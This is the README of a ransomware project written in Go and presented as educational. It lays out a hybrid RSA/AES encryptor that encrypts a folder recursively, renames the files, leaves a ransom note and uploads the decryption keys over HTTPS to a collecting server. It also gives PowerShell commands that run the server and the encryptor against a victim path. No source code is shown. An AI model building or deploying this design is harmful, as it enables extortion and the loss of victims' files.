# 🖥️ Home-made Ransomware💡

## 🚀 A Bold Attempt 

This was conceived as an experiment, I tried to code it without breaking my laptop. 😅 
ALL ETHICAL, ALL EDUCATIONAL.

## ✨ Features

- Hybrid encryption: RSA + AES
- Key separation: server, client, session keys
- HTTPS upload of encrypted keys to remote server
- Self-signed certificate generation for local HTTPS
- Modular structure with clean binaries



## 📖 Components

### `encryptor`
- Encrypts files recursively in a target folder.
- Renames them with `.jjj` extension.
- Generates:
  - `file.keys` (AES keys per file)
  - `master.key` (encrypted client private key)
  - `server.key` (RSA key used to decrypt the client key)
  - `warning.txt` with ransom note
- Uploads `file.keys` and `master.key` to the server via HTTPS.

### `server`
- Listens on `https://<SERVER_HOST>:<SERVER_PORT>/upload`
- Accepts `file.keys` and `master.key`
- Saves them under `data/YYYYMMDD-HHMMSS/`
- Automatically generates a self-signed cert if needed

### `decryptor`
- Recovers `.jjj` files using `server.key`, `master.key`, and `file.keys`
- Restores the original filenames and extensions


## 🚀 Getting Started

<b> Note </b> : You can use the `.env.example` file or use Linux envs as shown in the following comands!

### Option 1: Using compiled binaries (recommended)

1. Open PowerShell and run the server:

```powershell
$env:SERVER_HOST = "localhost"
$env:SERVER_PORT = "8443"
releases/server.exe
```

2. In separate terminal, run the encryptor:
```powershell
$env:SERVER_HOST = "localhost"
$env:SERVER_PORT = "8443"
$env:RANSOM_MESSAGE = "Your files have been encrypted. Contact us."
releases/encryptor.exe FilePathToEncrypt
```

3. To decrypt later:
```powershell
releases/decryptor.exe EncryptedFilePath
```
### Option 2: Using go run (for development)
1. Run the server:
```powershell
$env:SERVER_HOST = "localhost"
$env:SERVER_PORT = "8443"
go run cmd/server/server.go
```

2. Run the encryptor:
```powershell
$env:SERVER_HOST = "localhost"
$env:SERVER_PORT = "8443"
$env:RANSOM_MESSAGE = "Your files have been encrypted. Contact us."
go run cmd/agent/encryptor.go VictimPath
```

3. Decrypt if needed:
```powershell
go run cmd/agent/decryptor.go EncryptedFiles
```

## 🚫 Legal Notice

This software is intended **strictly for educational and ethical testing purposes**.  
It must not be used in real-world systems or against machines you do not own or have explicit permission to test.

---

<p align="center">
  <img src="https://github.com/user-attachments/assets/39f38f68-d36c-4d91-bebe-836b129d1244" alt="imagen">
</p>
